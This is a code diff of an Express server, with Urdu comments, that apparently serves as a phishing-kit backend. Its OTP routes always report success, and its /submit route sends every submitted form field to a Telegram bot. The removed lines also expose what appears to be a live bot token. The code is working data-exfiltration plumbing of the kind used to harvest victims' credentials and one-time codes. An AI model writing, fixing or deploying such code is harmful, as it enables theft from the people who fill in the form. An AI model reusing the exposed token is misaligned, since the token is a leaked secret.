@@ -1,5 +1,6 @@
 const express = require('express');
 const path = require('path');
+const https = require('https');
 const app = express();
 
 app.use(express.json());
@@ -10,35 +11,67 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.post('/send-otp', (req, res) => res.json({ success: true }));
 app.post('/verify-otp', (req, res) => res.json({ success: true }));
 
-// ٹیلی گرام پر ڈیٹا بھیجنے کا روٹ (اسے لازمی شامل کریں)
-app.post('/submit', async (req, res) => {
+// ٹیلی گرام پر ڈیٹا بھیجنے کا روٹ
+app.post('/submit', (req, res) => {
     try {
         const formData = req.body;
 
-        // ⚠️ اپنے بوٹ کا ٹوکن اور چیٹ آئی ڈی یہاں لکھیں
-        const BOT_TOKEN =  8901511141:AAE_ye6xJaHTsEPdIOp5IcCagk60eSXllX8// اپنا پورا ٹوکن یہاں ڈالیں
-        const CHAT_ID = ";8901511141 // اپنی چیٹ آئی ڈی یہاں ڈالیں
+        // ⚠️ اپنے ٹوکن اور چیٹ آئی ڈی کو یہاں انورٹڈ کوما (Quotes) کے اندر بالکل صحیح لکھیں
+        const BOT_TOKEN = "7983196238:AAHTL..."; // اپنا مکمل ٹوکن یہاں لکھیں
+        const CHAT_ID = "6197259..."; // اپنی چیٹ آئی ڈی یہاں لکھیں
 
+        // اگر ٹوکن ابھی بھی تبدیل نہیں ہوا تو فرنٹ اینڈ کو بتائیں
+        if (BOT_TOKEN.includes("...") || CHAT_ID.includes("...")) {
+            return res.status(400).json({ error: "Please insert your real Telegram Bot Token and Chat ID in server.js" });
+        }
+
+        // میسج ٹیکسٹ تیار کریں
         let message = "📝 *New Form Submission*\n\n";
         for (const [key, value] of Object.entries(formData)) {
             message += `*${key}:* ${value}\n`;
         }
 
-        const response = await fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+        const telegramData = JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
         });
 
-        if (!response.ok) return res.status(500).json({ error: "Telegram API Error" });
-        return res.status(200).json({ success: true });
+        const options = {
+            hostname: 'api.telegram.org',
+            port: 443,
+            path: `/bot${BOT_TOKEN}/sendMessage`,
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Content-Length': telegramData.length
+            }
+        };
+
+        const telegramReq = https.request(options, (telegramRes) => {
+            let body = '';
+            telegramRes.on('data', (chunk) => body += chunk);
+            
+            telegramRes.on('end', () => {
+                if (telegramRes.statusCode === 200) {
+                    return res.status(200).json({ success: true });
+                } else {
+                    // اگر ٹیلی گرام بلاک کر رہا ہے یا ٹوکن غلط ہے تو وہ ایرر یہاں دیکھے گا
+                    return res.status(400).json({ error: `Telegram API Error: Status ${telegramRes.statusCode} - ${body}` });
+                }
+            });
+        });
+
+        telegramReq.on('error', (e) => {
+            return res.status(500).json({ error: `Telegram Request Failed: ${e.message}` });
+        });
+
+        telegramReq.write(telegramData);
+        telegramReq.end();
 
     } catch (error) {
-        return res.status(500).json({ error: "Internal Error" });
+        // سرور کے کوڈ کا اصل ایرر فرنٹ اینڈ پر بھیجیں
+        return res.status(500).json({ error: `Server Crash Error: ${error.message}` });
     }
 });
 
